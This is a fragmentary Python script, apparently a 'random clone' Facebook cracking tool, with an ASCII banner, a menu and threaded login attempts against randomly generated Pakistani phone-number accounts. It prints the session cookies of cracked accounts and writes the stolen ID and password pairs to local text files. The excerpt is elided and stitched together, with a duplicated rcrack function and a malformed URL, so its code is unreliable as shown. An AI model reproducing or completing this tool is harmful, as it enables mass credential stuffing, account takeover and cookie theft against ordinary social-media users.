...
██   ██ ██    ██ ██    ██    ██   ██ 
 █████   ██████  ██    ██    ██   ██ 
\033[1;37m------------------------------------
\033[1;37m Owner   : MD SHIMUL
\033[1;37m Facebook:MD SHIMUL
\033[1;37m Github  : MRSH4MUL
\033[1;37m Version : 1.0
\033[1;37m------------------------------------
\33[1;97m\33[42m[\33[1;31mTOOLS\x1b[38;5;208m: \33[1;31mMRSH4MUL  RANDOM CLONE TOOL \33[1;97m-1.0\33[1;97m]\x1b[0m
\33[1;92m---------------------------------------""") 
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://https://www.facebook.com/md.shimul.705874")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[AHSAM-JOIYA-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;97m{coki}")
				open('AHSAM-JOIYA-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[AHSAM-JOIYA-CP] '+uid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[MR-JOIYA] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
...
def random_pak_number():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[?] \033[1;97mCHOICE SIM CODE : \033[1;32m'+kode)
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[AHSAM-JOIYA-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mAHSAM-JOIYA\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 
